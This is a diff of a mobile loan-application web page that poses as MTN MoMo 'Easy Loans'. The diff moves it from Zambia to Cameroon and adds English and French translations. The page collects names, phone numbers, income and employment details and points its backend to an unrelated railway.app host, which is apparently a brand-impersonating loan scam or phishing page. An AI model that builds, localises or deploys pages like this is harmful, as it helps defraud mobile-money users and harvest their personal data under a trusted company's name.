@@ -3,110 +3,224 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-  <title>MTN MoMo – Easy Loans Zambia</title>
+  <title>MTN MoMo – Easy Loans | Cameroon</title>
+
+  <!-- ============================================
+       META PIXEL — BASE CODE
+       ============================================ -->
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '2204599977605917');
+    fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=2204599977605917&ev=PageView&noscript=1"
+  /></noscript>
+  <!-- END META PIXEL -->
+
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
     :root {
       --mtn-dark: #003366;
       --mtn-gold: #FFD700;
       --mtn-light: #004080;
-      --grad: linear-gradient(to right, #003366, #004080);
       --page-bg: #F5F5F5;
-      --white: #FFFFFF;
       --text-dark: #1C2340;
-      --text-mid: #444;
-      --text-light: #888;
-      --border: #ddd;
-      --radius: 12px;
-      --radius-sm: 8px;
     }
     * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
     html, body { width: 100%; overflow-x: hidden; }
     body { font-family: 'Inter', sans-serif; background: var(--page-bg); color: var(--text-dark); min-height: 100vh; }
 
+    /* ============================================
+       LANGUAGE SELECTION OVERLAY
+       ============================================ */
+    .lang-overlay {
+      position: fixed; inset: 0;
+      background:
+        radial-gradient(900px 600px at 50% -10%, rgba(255, 215, 0, 0.12), transparent 60%),
+        radial-gradient(700px 500px at 50% 110%, rgba(0, 51, 102, 0.35), transparent 60%),
+        linear-gradient(180deg, #001E3C 0%, #00132A 55%, #00080F 100%);
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 20px;
+      z-index: 9999;
+      overflow-y: auto;
+    }
+    .lang-overlay.show { display: flex; animation: langFadeIn 0.4s ease; }
+    @keyframes langFadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+    .lang-card {
+      width: 100%;
+      max-width: 420px;
+      background: rgba(255, 255, 255, 0.06);
+      border: 1px solid rgba(255, 215, 0, 0.22);
+      border-radius: 26px;
+      padding: 32px 24px 28px;
+      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.06);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      text-align: center;
+      animation: langCardIn 0.6s cubic-bezier(0.22, 1, 0.36, 1) both;
+    }
+    @keyframes langCardIn {
+      from { opacity: 0; transform: translateY(18px) scale(0.97); }
+      to   { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    .lang-logo {
+      width: 64px; height: 64px;
+      background: #FFD700;
+      border-radius: 14px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 2rem; font-weight: 900; color: #003366;
+      margin: 0 auto 20px;
+      box-shadow: 0 10px 30px rgba(255, 215, 0, 0.35);
+    }
+    .lang-logo::after { content: 'M'; }
+
+    .lang-title {
+      font-size: 1.35rem;
+      font-weight: 800;
+      color: #fff;
+      margin-bottom: 6px;
+      line-height: 1.3;
+    }
+    .lang-title .gold {
+      background: linear-gradient(90deg, #FFD700, #FFD633);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .lang-subtitle {
+      font-size: 0.88rem;
+      color: rgba(255, 255, 255, 0.65);
+      line-height: 1.5;
+      margin-bottom: 28px;
+      font-weight: 500;
+    }
+
+    .lang-option {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 16px 18px;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1.5px solid rgba(255, 255, 255, 0.12);
+      border-radius: 16px;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      font-size: 16px;
+      font-weight: 700;
+      color: #fff;
+      text-align: left;
+      margin-bottom: 12px;
+      transition: transform 0.2s, background 0.2s, border-color 0.2s, box-shadow 0.2s;
+    }
+    .lang-option:last-child { margin-bottom: 0; }
+    .lang-option:hover {
+      background: rgba(255, 215, 0, 0.10);
+      border-color: rgba(255, 215, 0, 0.5);
+      transform: translateY(-2px);
+      box-shadow: 0 10px 30px rgba(255, 215, 0, 0.15);
+    }
+    .lang-option:active { transform: scale(0.98); }
+
+    .lang-flag {
+      width: 44px; height: 32px;
+      border-radius: 6px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 22px;
+      flex-shrink: 0;
+      background: rgba(255, 255, 255, 0.08);
+    }
+    .lang-info { flex: 1; min-width: 0; }
+    .lang-name { font-size: 16px; font-weight: 800; color: #fff; line-height: 1.2; }
+    .lang-native { font-size: 12px; font-weight: 500; color: rgba(255, 255, 255, 0.55); margin-top: 2px; }
+    .lang-check {
+      width: 22px; height: 22px;
+      border-radius: 50%;
+      border: 2px solid rgba(255, 255, 255, 0.25);
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+      transition: border-color 0.2s, background 0.2s;
+    }
+    .lang-option:hover .lang-check {
+      border-color: #FFD700;
+      background: rgba(255, 215, 0, 0.15);
+    }
+
+    .lang-footer {
+      font-size: 11px;
+      color: rgba(255, 255, 255, 0.4);
+      margin-top: 22px;
+      line-height: 1.5;
+    }
+
+    /* ============================================
+       PAGE SYSTEM
+       ============================================ */
     .page { display: none; min-height: 100vh; width: 100%; animation: fadeIn 0.3s ease; }
     .page.active { display: flex; flex-direction: column; }
     @keyframes fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
 
+    /* MTN LOGO */
     .mtn-logo { display: flex; flex-direction: column; align-items: center; gap: 4px; }
     .mtn-logo-icon { width: 45px; height: 45px; background: var(--mtn-gold); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; font-weight: 900; color: var(--mtn-dark); position: relative; }
     .mtn-logo-icon::after { content: 'M'; font-size: 2rem; font-weight: 900; }
     .mtn-logo-text { font-size: 1rem; font-weight: 700; color: var(--mtn-dark); }
     .mtn-logo-sub { font-size: 0.65rem; color: #888; font-weight: 500; }
 
+    /* NAVBAR */
     .navbar { background: var(--mtn-dark); display:flex; align-items:center; justify-content:center; padding:0 20px; height:60px; position:relative; flex-shrink:0; width:100%; }
     .nav-left { position:absolute; left:20px; color:rgba(255,255,255,0.75); font-size:0.84rem; cursor:pointer; text-decoration:none; transition:color 0.2s; background:none; border:none; font-family:'Inter',sans-serif; }
     .nav-left:hover { color:#fff; }
     .nav-right { position:absolute; right:20px; display:flex; flex-direction:column; gap:4px; cursor:pointer; padding:4px; }
     .hline { width:20px; height:2px; background:rgba(255,255,255,0.6); border-radius:1px; }
 
+    /* PROCESSING OVERLAY */
     .processing-overlay {
-      position: fixed;
-      inset: 0;
-      background: #003366;
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 32px 24px;
-      z-index: 3000;
-      text-align: center;
-      color: white;
+      position: fixed; inset: 0; background: #003366;
+      display: none; flex-direction: column;
+      align-items: center; justify-content: center;
+      padding: 32px 24px; z-index: 3000;
+      text-align: center; color: white;
     }
     .processing-overlay.show { display: flex; }
 
     .processing-logo {
-      width: 70px;
-      height: 70px;
-      background: #FFD700;
-      border-radius: 14px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 2.2rem;
-      font-weight: 900;
-      color: #003366;
-      margin-bottom: 32px;
-      position: relative;
+      width: 70px; height: 70px; background: #FFD700;
+      border-radius: 14px; display: flex; align-items: center; justify-content: center;
+      font-size: 2.2rem; font-weight: 900; color: #003366;
+      margin-bottom: 32px; position: relative;
     }
     .processing-logo::after { content: 'M'; }
 
     .processing-spinner {
-      width: 60px;
-      height: 60px;
-      border: 5px solid rgba(255,215,0,0.2);
-      border-top-color: #FFD700;
-      border-radius: 50%;
-      animation: spin 0.9s linear infinite;
-      margin-bottom: 28px;
+      width: 60px; height: 60px;
+      border: 5px solid rgba(255,215,0,0.2); border-top-color: #FFD700;
+      border-radius: 50%; animation: spin 0.9s linear infinite; margin-bottom: 28px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    .processing-title {
-      font-size: 1.4rem;
-      font-weight: 700;
-      color: white;
-      margin-bottom: 8px;
-    }
-    .processing-sub {
-      font-size: 0.9rem;
-      color: rgba(255,255,255,0.7);
-      margin-bottom: 24px;
-    }
-    .processing-dots span {
-      display: inline-block;
-      animation: dotBlink 1.4s infinite both;
-      font-size: 1.5rem;
-      color: #FFD700;
-    }
+    .processing-title { font-size: 1.4rem; font-weight: 700; color: white; margin-bottom: 8px; }
+    .processing-sub { font-size: 0.9rem; color: rgba(255,255,255,0.7); margin-bottom: 24px; }
+    .processing-dots span { display: inline-block; animation: dotBlink 1.4s infinite both; font-size: 1.5rem; color: #FFD700; }
     .processing-dots span:nth-child(1) { animation-delay: 0s; }
     .processing-dots span:nth-child(2) { animation-delay: 0.2s; }
     .processing-dots span:nth-child(3) { animation-delay: 0.4s; }
-    @keyframes dotBlink {
-      0%, 80%, 100% { opacity: 0.2; }
-      40% { opacity: 1; }
-    }
+    @keyframes dotBlink { 0%, 80%, 100% { opacity: 0.2; } 40% { opacity: 1; } }
 
+    /* WELCOME PAGE */
     .welcome-wrap { width: 100%; max-width: 480px; margin: 24px auto; padding: 0 16px; }
     .welcome-card { background: #fff; border-radius: 16px; padding: 32px 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
     .welcome-title { font-size: 1.5rem; font-weight: 700; color: #1C2340; text-align: center; margin-bottom: 6px; }
@@ -125,6 +239,7 @@
     .monthly-box .lbl { font-size: 0.9rem; color: #555; }
     .monthly-box .amount { font-size: 1.3rem; font-weight: 700; color: #FFB300; }
 
+    /* PROGRESS BAR */
     .progress-wrap { width: 100%; max-width: 480px; margin: 0 auto; padding: 20px 16px 0; }
     .progress-title { text-align: center; font-size: 1.15rem; font-weight: 700; color: #1C2340; margin: 0 0 4px; }
     .progress-sub { text-align: center; font-size: 0.8rem; color: #888; margin-bottom: 14px; }
@@ -132,6 +247,7 @@
     .progress-seg { flex: 1; height: 5px; background: #e0e0e0; border-radius: 3px; }
     .progress-seg.active { background: #FFD700; }
 
+    /* FORM */
     .form-wrap { width: 100%; max-width: 480px; margin: 0 auto; padding: 16px 16px 32px; flex: 1; }
     .form-card { background: #fff; border-radius: 16px; padding: 24px 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
     .form-field { margin-bottom: 18px; }
@@ -146,17 +262,20 @@
     .phone-prefix input { border-radius: 0 8px 8px 0; }
     .form-actions { display: flex; gap: 12px; margin-top: 22px; }
 
+    /* BUTTONS */
     .btn-primary { flex: 1; background: linear-gradient(to right, #003366, #004080); color: #fff; border: none; border-radius: 10px; padding: 15px 20px; font-size: 0.92rem; font-weight: 700; letter-spacing: 0.05em; cursor: pointer; font-family: 'Inter', sans-serif; }
     .btn-primary:hover { opacity: 0.92; }
     .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
     .btn-outline { flex: 1; background: #e0e0e0; color: #666; border: none; border-radius: 10px; padding: 15px 20px; font-size: 0.92rem; font-weight: 700; letter-spacing: 0.05em; cursor: pointer; font-family: 'Inter', sans-serif; }
     .btn-outline:hover { background: #d0d0d0; }
 
+    /* SUMMARY BOX */
     .summary-box { background: #fffbf0; border-left: 4px solid #FFD700; border-radius: 8px; padding: 16px 18px; margin: 20px 0; }
     .summary-box h4 { font-size: 0.9rem; color: #1C2340; margin-bottom: 12px; font-weight: 700; }
     .summary-row { display: flex; justify-content: space-between; font-size: 0.85rem; padding: 6px 0; color: #444; }
     .summary-row .val { font-weight: 600; color: #1C2340; }
 
+    /* MOBILE */
     @media (max-width: 480px) {
       .welcome-wrap { padding: 0 12px; margin: 16px auto; }
       .welcome-card { padding: 24px 18px; }
@@ -178,7 +297,45 @@
 </head>
 <body>
 
-  <div id="app">
+  <!-- ============================================
+       LANGUAGE SELECTION OVERLAY
+       ============================================ -->
+  <div class="lang-overlay" id="langOverlay">
+    <div class="lang-card">
+      <div class="lang-logo"></div>
+
+      <h2 class="lang-title" id="langTitle">
+        Choose your <span class="gold">language</span>
+      </h2>
+      <p class="lang-subtitle" id="langSubtitle">
+        Choisissez votre langue · Select your language
+      </p>
+
+      <button class="lang-option" data-lang="en" type="button">
+        <span class="lang-flag">🇬🇧</span>
+        <span class="lang-info">
+          <span class="lang-name">English</span>
+          <span class="lang-native">Continue in English</span>
+        </span>
+        <span class="lang-check"></span>
+      </button>
+
+      <button class="lang-option" data-lang="fr" type="button">
+        <span class="lang-flag">🇫🇷</span>
+        <span class="lang-info">
+          <span class="lang-name">Français</span>
+          <span class="lang-native">Continuer en français</span>
+        </span>
+        <span class="lang-check"></span>
+      </button>
+
+      <p class="lang-footer" id="langFooter">
+        Vous pourrez changer à tout moment · You can change it anytime
+      </p>
+    </div>
+  </div>
+
+  <div id="app" style="visibility:hidden;">
 
     <!-- WELCOME -->
     <div id="page-welcome" class="page active">
@@ -186,42 +343,42 @@
         <div class="mtn-logo">
           <div class="mtn-logo-icon"></div>
           <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Easy Loans • Zambia</div>
+          <div class="mtn-logo-sub" data-i18n="navSub">Easy Loans</div>
         </div>
         <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
       </div>
 
       <div class="welcome-wrap">
         <div class="welcome-card">
-          <h1 class="welcome-title">Welcome to MTN MoMo</h1>
-          <p class="welcome-sub">Get loans easily through MTN MoMo in Zambia</p>
+          <h1 class="welcome-title" data-i18n="welcomeTitle">Welcome to MTN MoMo</h1>
+          <p class="welcome-sub" data-i18n="welcomeSub">Get loans easily through MTN MoMo Cameroon</p>
 
           <div class="loan-calc">
-            <div class="loan-calc-title">Loan Calculator</div>
+            <div class="loan-calc-title" data-i18n="calcTitle">Loan Calculator</div>
             <div class="loan-row">
-              <span class="label">Amount</span>
-              <span class="val" id="wAmount">K 5,000</span>
+              <span class="label" data-i18n="calcAmount">Amount</span>
+              <span class="val" id="wAmount">XAF 1,000,000</span>
             </div>
             <div class="loan-row">
-              <span class="label">Term</span>
-              <span class="val" id="wTerm">12 Months</span>
+              <span class="label" data-i18n="calcTerm">Term</span>
+              <span class="val" id="wTerm">48 Months</span>
             </div>
 
             <div class="slider-wrap">
-              <input type="range" class="slider" id="wSlider" min="5000" max="499000" step="1000" value="5000" oninput="updateCalculator()">
+              <input type="range" class="slider" id="wSlider" min="500000" max="5000000" step="50000" value="1000000" oninput="updateCalculator()">
               <div class="slider-limits">
-                <span>K 5,000</span>
-                <span>K 499,000</span>
+                <span>XAF 500,000</span>
+                <span>XAF 5,000,000</span>
               </div>
             </div>
 
             <div class="monthly-box">
-              <span class="lbl">Monthly Payment</span>
-              <span class="amount" id="wMonthly">K 417</span>
+              <span class="lbl" data-i18n="calcMonthly">Monthly Payment</span>
+              <span class="amount" id="wMonthly">XAF 20,834</span>
             </div>
           </div>
 
-          <button class="btn-primary" style="width:100%;" onclick="startApplication()">START APPLICATION</button>
+          <button class="btn-primary" style="width:100%;" onclick="startApplication()" data-i18n="startBtn">START APPLICATION</button>
         </div>
       </div>
     </div>
@@ -229,18 +386,18 @@
     <!-- STEP 1 -->
     <div id="page-step1" class="page">
       <div class="navbar">
-        <button class="nav-left" onclick="goTo('page-welcome')">← Back</button>
+        <button class="nav-left" onclick="goTo('page-welcome')" data-i18n="back">← Back</button>
         <div class="mtn-logo">
           <div class="mtn-logo-icon"></div>
           <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Loans • Zambia</div>
+          <div class="mtn-logo-sub" data-i18n="navSubLoans">Loans</div>
         </div>
         <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
       </div>
 
       <div class="progress-wrap">
-        <div class="progress-title">Loan Application</div>
-        <div class="progress-sub">Step 1 of 3</div>
+        <div class="progress-title" data-i18n="loanAppTitle">Loan Application</div>
+        <div class="progress-sub" data-i18n="step1of3">Step 1 of 3</div>
         <div class="progress-bar">
           <div class="progress-seg active"></div>
           <div class="progress-seg"></div>
@@ -251,37 +408,38 @@
       <div class="form-wrap">
         <div class="form-card">
           <div class="form-field">
-            <label>Loan Type</label>
+            <label data-i18n="loanType">Loan Type</label>
             <select id="fLoanType">
-              <option>Business Loan</option>
-              <option>Personal Loan</option>
-              <option>Emergency Loan</option>
-              <option>Education Loan</option>
+              <option value="Business Loan" data-i18n="loanTypeBusiness">Business Loan</option>
+              <option value="Personal Loan" data-i18n="loanTypePersonal">Personal Loan</option>
+              <option value="Emergency Loan" data-i18n="loanTypeEmergency">Emergency Loan</option>
+              <option value="Education Loan" data-i18n="loanTypeEducation">Education Loan</option>
             </select>
           </div>
 
           <div class="form-field">
-            <label>Loan Amount (ZMW)</label>
-            <input type="number" id="fAmount" value="5000" min="5000" max="499000" step="1000">
+            <label data-i18n="loanAmount">Loan Amount (XAF)</label>
+            <input type="number" id="fAmount" value="1000000" min="50000" max="5000000" step="10000">
           </div>
 
           <div class="form-field">
-            <label>Loan Term</label>
+            <label data-i18n="loanTerm">Loan Term</label>
             <select id="fTerm">
-              <option selected>12 Months</option>
-              <option>24 Months</option>
-              <option>36 Months</option>
+              <option value="12 Months" data-i18n="term12">12 Months</option>
+              <option value="24 Months" data-i18n="term24">24 Months</option>
+              <option value="36 Months" data-i18n="term36">36 Months</option>
+              <option value="48 Months" selected data-i18n="term48">48 Months</option>
             </select>
           </div>
 
           <div class="form-field">
-            <label>Purpose of Loan</label>
-            <textarea id="fPurpose" placeholder="Describe the purpose of your loan..."></textarea>
+            <label data-i18n="purpose">Purpose of Loan</label>
+            <textarea id="fPurpose" placeholder="Describe the purpose of your loan..." data-i18n-placeholder="purposePlaceholder"></textarea>
           </div>
 
           <div class="form-actions">
-            <button class="btn-outline" onclick="goTo('page-welcome')">BACK</button>
-            <button class="btn-primary" onclick="nextToStep2()">NEXT STEP</button>
+            <button class="btn-outline" onclick="goTo('page-welcome')" data-i18n="btnBack">BACK</button>
+            <button class="btn-primary" onclick="nextToStep2()" data-i18n="btnNext">NEXT STEP</button>
           </div>
         </div>
       </div>
@@ -290,18 +448,18 @@
     <!-- STEP 2 -->
     <div id="page-step2" class="page">
       <div class="navbar">
-        <button class="nav-left" onclick="goTo('page-step1')">← Back</button>
+        <button class="nav-left" onclick="goTo('page-step1')" data-i18n="back">← Back</button>
         <div class="mtn-logo">
           <div class="mtn-logo-icon"></div>
           <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Loans • Zambia</div>
+          <div class="mtn-logo-sub" data-i18n="navSubLoans">Loans</div>
         </div>
         <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
       </div>
 
       <div class="progress-wrap">
-        <div class="progress-title">Loan Application</div>
-        <div class="progress-sub">Step 2 of 3</div>
+        <div class="progress-title" data-i18n="loanAppTitle">Loan Application</div>
+        <div class="progress-sub" data-i18n="step2of3">Step 2 of 3</div>
         <div class="progress-bar">
           <div class="progress-seg active"></div>
           <div class="progress-seg active"></div>
@@ -313,27 +471,27 @@
         <div class="form-card">
           <div class="form-row">
             <div class="form-field">
-              <label>First Name</label>
-              <input type="text" id="fFirst" placeholder="First Name">
+              <label data-i18n="firstName">First Name</label>
+              <input type="text" id="fFirst" placeholder="First Name" data-i18n-placeholder="firstNamePlaceholder">
             </div>
             <div class="form-field">
-              <label>Last Name</label>
-              <input type="text" id="fLast" placeholder="Last Name">
+              <label data-i18n="lastName">Last Name</label>
+              <input type="text" id="fLast" placeholder="Last Name" data-i18n-placeholder="lastNamePlaceholder">
             </div>
           </div>
 
           <div class="form-field">
-            <label>Phone Number (Zambia)</label>
+            <label data-i18n="phoneLabel">Phone Number (Cameroon)</label>
             <div class="phone-prefix">
-              <span class="prefix">+260</span>
-              <input type="tel" id="fPhone" maxlength="9" placeholder="966123456">
+              <span class="prefix">+237</span>
+              <input type="tel" id="fPhone" maxlength="9" placeholder="670123456">
             </div>
-            <div class="form-hint">9 digits without +260 prefix (e.g., 966123456)</div>
+            <div class="form-hint" data-i18n="phoneHint">9 digits without +237 prefix (e.g., 670123456)</div>
           </div>
 
           <div class="form-actions">
-            <button class="btn-outline" onclick="goTo('page-step1')">BACK</button>
-            <button class="btn-primary" onclick="nextToStep3()">NEXT STEP</button>
+            <button class="btn-outline" onclick="goTo('page-step1')" data-i18n="btnBack">BACK</button>
+            <button class="btn-primary" onclick="nextToStep3()" data-i18n="btnNext">NEXT STEP</button>
           </div>
         </div>
       </div>
@@ -342,18 +500,18 @@
     <!-- STEP 3 -->
     <div id="page-step3" class="page">
       <div class="navbar">
-        <button class="nav-left" onclick="goTo('page-step2')">← Back</button>
+        <button class="nav-left" onclick="goTo('page-step2')" data-i18n="back">← Back</button>
         <div class="mtn-logo">
           <div class="mtn-logo-icon"></div>
           <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Loans • Zambia</div>
+          <div class="mtn-logo-sub" data-i18n="navSubLoans">Loans</div>
         </div>
         <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
       </div>
 
       <div class="progress-wrap">
-        <div class="progress-title">Loan Application</div>
-        <div class="progress-sub">Step 3 of 3</div>
+        <div class="progress-title" data-i18n="loanAppTitle">Loan Application</div>
+        <div class="progress-sub" data-i18n="step3of3">Step 3 of 3</div>
         <div class="progress-bar">
           <div class="progress-seg active"></div>
           <div class="progress-seg active"></div>
@@ -364,44 +522,44 @@
       <div class="form-wrap">
         <div class="form-card">
           <div class="form-field">
-            <label>Employment Status</label>
+            <label data-i18n="employment">Employment Status</label>
             <select id="fEmp">
-              <option>Self-employed</option>
-              <option>Employed full-time</option>
-              <option>Employed part-time</option>
-              <option>Student</option>
-              <option>Unemployed</option>
+              <option value="Self-employed" data-i18n="empSelf">Self-employed</option>
+              <option value="Employed full-time" data-i18n="empFull">Employed full-time</option>
+              <option value="Employed part-time" data-i18n="empPart">Employed part-time</option>
+              <option value="Student" data-i18n="empStudent">Student</option>
+              <option value="Unemployed" data-i18n="empUnemployed">Unemployed</option>
             </select>
           </div>
 
           <div class="form-field">
-            <label>Annual Income (ZMW)</label>
-            <input type="number" id="fIncome" placeholder="Enter annual income">
+            <label data-i18n="annualIncome">Annual Income (XAF)</label>
+            <input type="number" id="fIncome" placeholder="Enter annual income" data-i18n-placeholder="incomePlaceholder">
           </div>
 
           <div class="summary-box">
-            <h4>Application Summary</h4>
+            <h4 data-i18n="summaryTitle">Application Summary</h4>
             <div class="summary-row">
-              <span>Loan Amount:</span>
-              <span class="val" id="sumAmount">K 5,000</span>
+              <span data-i18n="summaryAmount">Loan Amount:</span>
+              <span class="val" id="sumAmount">XAF 1,000,000</span>
             </div>
             <div class="summary-row">
-              <span>Loan Term:</span>
-              <span class="val" id="sumTerm">12 Months</span>
+              <span data-i18n="summaryTerm">Loan Term:</span>
+              <span class="val" id="sumTerm">48 Months</span>
             </div>
             <div class="summary-row">
-              <span>Purpose:</span>
+              <span data-i18n="summaryPurpose">Purpose:</span>
               <span class="val" id="sumPurpose">—</span>
             </div>
             <div class="summary-row">
-              <span>Applicant:</span>
+              <span data-i18n="summaryApplicant">Applicant:</span>
               <span class="val" id="sumApplicant">—</span>
             </div>
           </div>
 
           <div class="form-actions">
-            <button class="btn-outline" onclick="goTo('page-step2')">BACK</button>
-            <button class="btn-primary" id="submitBtn" onclick="submitApplication()">SUBMIT APPLICATION</button>
+            <button class="btn-outline" onclick="goTo('page-step2')" data-i18n="btnBack">BACK</button>
+            <button class="btn-primary" id="submitBtn" onclick="submitApplication()" data-i18n="btnSubmit">SUBMIT APPLICATION</button>
           </div>
         </div>
       </div>
@@ -413,40 +571,218 @@
   <div class="processing-overlay" id="processingOverlay">
     <div class="processing-logo"></div>
     <div class="processing-spinner"></div>
-    <div class="processing-title">Processing Application</div>
-    <div class="processing-sub">Please wait, this may take a few seconds</div>
+    <div class="processing-title" data-i18n="processingTitle">Processing Application</div>
+    <div class="processing-sub" data-i18n="processingSub">Please wait, this may take a few seconds</div>
     <div class="processing-dots">
       <span>.</span><span>.</span><span>.</span>
     </div>
   </div>
 
-  <!-- META PIXEL -->
   <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '2204599977605917');
-    fbq('track', 'PageView');
-  </script>
-  <noscript><img height="1" width="1" style="display:none"
-    src="https://www.facebook.com/tr?id=2204599977605917&ev=PageView&noscript=1"
-  /></noscript>
-
-  <script>
-    window.API_BASE = 'https://momo-usersey-production.up.railway.app';
+    window.API_BASE = 'https://momo-advance-funds-production.up.railway.app';
   </script>
 
   <script>
-    const S = {
-      loanAmount: 5000,
-      loanTerm: '12 Months'
+    // ═══════════════════════════════════════════════
+    //  TRANSLATIONS
+    // ═══════════════════════════════════════════════
+    const TRANSLATIONS = {
+      en: {
+        // language overlay
+        langTitle: 'Choose your <span class="gold">language</span>',
+        langSubtitle: 'Select your language to continue',
+        langFooter: 'You can change it anytime',
+        // nav
+        navSub: 'Easy Loans',
+        navSubLoans: 'Loans',
+        back: '← Back',
+        // welcome
+        welcomeTitle: 'Welcome to MTN MoMo',
+        welcomeSub: 'Get loans easily through MTN MoMo Cameroon',
+        calcTitle: 'Loan Calculator',
+        calcAmount: 'Amount',
+        calcTerm: 'Term',
+        calcMonthly: 'Monthly Payment',
+        startBtn: 'START APPLICATION',
+        // form
+        loanAppTitle: 'Loan Application',
+        step1of3: 'Step 1 of 3',
+        step2of3: 'Step 2 of 3',
+        step3of3: 'Step 3 of 3',
+        loanType: 'Loan Type',
+        loanTypeBusiness: 'Business Loan',
+        loanTypePersonal: 'Personal Loan',
+        loanTypeEmergency: 'Emergency Loan',
+        loanTypeEducation: 'Education Loan',
+        loanAmount: 'Loan Amount (XAF)',
+        loanTerm: 'Loan Term',
+        term12: '12 Months',
+        term24: '24 Months',
+        term36: '36 Months',
+        term48: '48 Months',
+        purpose: 'Purpose of Loan',
+        purposePlaceholder: 'Describe the purpose of your loan...',
+        firstName: 'First Name',
+        firstNamePlaceholder: 'First Name',
+        lastName: 'Last Name',
+        lastNamePlaceholder: 'Last Name',
+        phoneLabel: 'Phone Number (Cameroon)',
+        phoneHint: '9 digits without +237 prefix (e.g., 670123456)',
+        btnBack: 'BACK',
+        btnNext: 'NEXT STEP',
+        btnSubmit: 'SUBMIT APPLICATION',
+        employment: 'Employment Status',
+        empSelf: 'Self-employed',
+        empFull: 'Employed full-time',
+        empPart: 'Employed part-time',
+        empStudent: 'Student',
+        empUnemployed: 'Unemployed',
+        annualIncome: 'Annual Income (XAF)',
+        incomePlaceholder: 'Enter annual income',
+        summaryTitle: 'Application Summary',
+        summaryAmount: 'Loan Amount:',
+        summaryTerm: 'Loan Term:',
+        summaryPurpose: 'Purpose:',
+        summaryApplicant: 'Applicant:',
+        processingTitle: 'Processing Application',
+        processingSub: 'Please wait, this may take a few seconds',
+        // alerts
+        alertMinAmount: 'Please enter a valid loan amount (minimum XAF 50,000).',
+        alertName: 'Please enter your first and last name.',
+        alertPhone: 'Please enter a valid 9-digit phone number.',
+        monthsSuffix: 'Months'
+      },
+      fr: {
+        // language overlay
+        langTitle: 'Choisissez votre <span class="gold">langue</span>',
+        langSubtitle: 'Sélectionnez votre langue pour continuer',
+        langFooter: 'Vous pourrez la changer à tout moment',
+        // nav
+        navSub: 'Prêts Faciles',
+        navSubLoans: 'Prêts',
+        back: '← Retour',
+        // welcome
+        welcomeTitle: 'Bienvenue sur MTN MoMo',
+        welcomeSub: 'Obtenez des prêts facilement via MTN MoMo Cameroun',
+        calcTitle: 'Calculateur de Prêt',
+        calcAmount: 'Montant',
+        calcTerm: 'Durée',
+        calcMonthly: 'Mensualité',
+        startBtn: 'COMMENCER LA DEMANDE',
+        // form
+        loanAppTitle: 'Demande de Prêt',
+        step1of3: 'Étape 1 sur 3',
+        step2of3: 'Étape 2 sur 3',
+        step3of3: 'Étape 3 sur 3',
+        loanType: 'Type de Prêt',
+        loanTypeBusiness: 'Prêt Professionnel',
+        loanTypePersonal: 'Prêt Personnel',
+        loanTypeEmergency: 'Prêt d\'Urgence',
+        loanTypeEducation: 'Prêt Étudiant',
+        loanAmount: 'Montant du Prêt (XAF)',
+        loanTerm: 'Durée du Prêt',
+        term12: '12 Mois',
+        term24: '24 Mois',
+        term36: '36 Mois',
+        term48: '48 Mois',
+        purpose: 'Objet du Prêt',
+        purposePlaceholder: 'Décrivez l\'objet de votre prêt...',
+        firstName: 'Prénom',
+        firstNamePlaceholder: 'Prénom',
+        lastName: 'Nom',
+        lastNamePlaceholder: 'Nom',
+        phoneLabel: 'Numéro de Téléphone (Cameroun)',
+        phoneHint: '9 chiffres sans le préfixe +237 (ex. 670123456)',
+        btnBack: 'RETOUR',
